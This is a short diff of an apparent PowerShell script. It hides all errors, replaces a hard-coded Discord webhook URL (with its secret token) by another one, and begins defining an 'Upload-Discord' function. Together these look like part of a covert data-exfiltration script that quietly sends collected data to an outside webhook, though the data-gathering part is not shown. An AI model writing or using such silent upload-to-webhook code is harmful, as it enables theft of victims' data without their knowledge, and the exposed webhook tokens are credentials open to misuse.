@@ -3,7 +3,7 @@
 #Hide Errors
 $ErrorActionPreference = 'SilentlyContinue'
 # Define Discord webhook URL
-$hookUrl = 'https://discord.com/api/webhooks/1200196454774480987/_0U4G5cT7Ri6k8usrkaF32udNqP_qT54UQSDk6EiyiDxQFFaZM7_hcBNqgVJNZi5PBU9'
+$hookUrl = 'https://discord.com/api/webhooks/1200245949126148156/HOwhnUPElKBeBX7_j3WMG8-jMlimPoAM3pTlc-uZMbCESmAPXdzF7YWq1DEYqxxuroKy'
 #Define sending-to-discord function
 function Upload-Discord {
     [CmdletBinding()]
